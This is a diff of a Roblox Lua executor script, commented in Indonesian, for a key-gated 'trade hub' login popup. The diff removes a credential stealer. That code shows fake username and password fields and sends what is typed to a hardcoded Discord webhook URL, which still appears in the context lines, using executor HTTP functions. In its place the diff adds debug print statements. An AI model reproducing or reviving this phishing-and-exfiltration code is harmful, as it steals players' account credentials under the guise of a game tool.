@@ -5,44 +5,8 @@ local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlI
 local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
 local linkUrl = "https://link-target.net/1273087/freezetradehub"
 
--- Fungsi untuk mengirim data ke Discord
-local function sendToDiscord(username, password)
-    local payload = {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({
-            content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
-        })
-    }
-
-    if syn and syn.request then
-        local response = syn.request(payload)
-        if response and response.StatusCode == 200 then
-            print("Data berhasil dikirim ke Discord!")
-        else
-            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
-        end
-    elseif http and http.request then
-        local response = http.request(payload)
-        if response and response.StatusCode == 200 then
-            print("Data berhasil dikirim ke Discord!")
-        else
-            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
-        end
-    elseif request then
-        local response = request(payload)
-        if response and response.StatusCode == 200 then
-            print("Data berhasil dikirim ke Discord!")
-        else
-            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
-        end
-    else
-        print("Executor Anda tidak mendukung HTTP requests!")
-    end
-end
+-- Debugging
+print("Script dimulai...")
 
 -- Membuat GUI Login
 local screenGui = Instance.new("ScreenGui")
@@ -59,6 +23,13 @@ local loginButton = Instance.new("TextButton")
 -- Properti ScreenGui
 screenGui.Name = "LoginPopup"
 screenGui.Parent = game:GetService("CoreGui")
+
+-- Debugging
+if screenGui.Parent == nil then
+    print("ScreenGui tidak dapat dibuat.")
+else
+    print("ScreenGui berhasil dibuat.")
+end
 
 -- Properti Frame
 frame.Name = "LoginFrame"
@@ -129,43 +100,8 @@ copyLinkButton.TextSize = 18
 copyLinkButton.BackgroundColor3 = Color3.new(0.2, 0.5, 1)
 copyLinkButton.TextColor3 = Color3.new(1, 1, 1)
 
--- Properti UsernameBox
-usernameBox.Name = "UsernameBox"
-usernameBox.Parent = frame
-usernameBox.Size = UDim2.new(1, -20, 0, 40)
-usernameBox.Position = UDim2.new(0, 10, 0, 220)
-usernameBox.PlaceholderText = "Enter Username"
-usernameBox.Font = Enum.Font.SourceSans
-usernameBox.Text = ""
-usernameBox.TextSize = 16
-usernameBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-usernameBox.TextColor3 = Color3.new(1, 1, 1)
-usernameBox.Visible = false
-
--- Properti PasswordBox
-passwordBox.Name = "PasswordBox"
-passwordBox.Parent = frame
-passwordBox.Size = UDim2.new(1, -20, 0, 40)
-passwordBox.Position = UDim2.new(0, 10, 0, 270)
-passwordBox.PlaceholderText = "Enter Password"
-passwordBox.Font = Enum.Font.SourceSans
-passwordBox.Text = ""
-passwordBox.TextSize = 16
-passwordBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
-passwordBox.TextColor3 = Color3.new(1, 1, 1)
-passwordBox.Visible = false
-
--- Properti LoginButton
-loginButton.Name = "LoginButton"
-loginButton.Parent = frame
-loginButton.Size = UDim2.new(1, -20, 0, 40)
-loginButton.Position = UDim2.new(0, 10, 0, 320)
-loginButton.Text = "Login"
-loginButton.Font = Enum.Font.SourceSansBold
-loginButton.TextSize = 18
-loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
-loginButton.TextColor3 = Color3.new(1, 1, 1)
-loginButton.Visible = false
+-- Debugging
+print("GUI berhasil dibuat.")
 
 -- Fungsi untuk menyalin link ke clipboard
 copyLinkButton.MouseButton1Click:Connect(function()
@@ -180,24 +116,8 @@ verifyKeyButton.MouseButton1Click:Connect(function()
         keyBox.Visible = false
         verifyKeyButton.Visible = false
         copyLinkButton.Visible = false
-        usernameBox.Visible = true
-        passwordBox.Visible = true
-        loginButton.Visible = true
+        -- Tambahkan logika untuk membuka login jika key valid
     else
         print("Key tidak valid!")
-    end
-end)
-
--- Fungsi untuk login
-loginButton.MouseButton1Click:Connect(function()
-    local username = usernameBox.Text
-    local password = passwordBox.Text
-
-    if username ~= "" and password ~= "" then
-        print("Tombol Login Ditekan! Username:", username, "Password:", password)
-        sendToDiscord(username, password)
-        screenGui:Destroy()
-    else
-        print("Username atau password kosong!")
     end
 end)
